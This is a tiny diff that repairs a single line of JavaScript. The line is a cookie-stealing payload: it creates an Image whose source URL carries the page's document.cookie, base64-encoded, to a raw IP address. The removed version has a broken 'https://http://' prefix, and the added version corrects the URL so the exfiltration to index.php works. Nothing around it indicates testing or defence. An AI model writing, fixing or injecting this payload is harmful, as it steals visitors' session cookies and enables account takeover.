@@ -1,2 +1,1 @@
-x = new Image(); x.src = 'https://http://48.209.17.125?
-data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://48.209.17.125/index.php?data='+btoa(document.cookie);
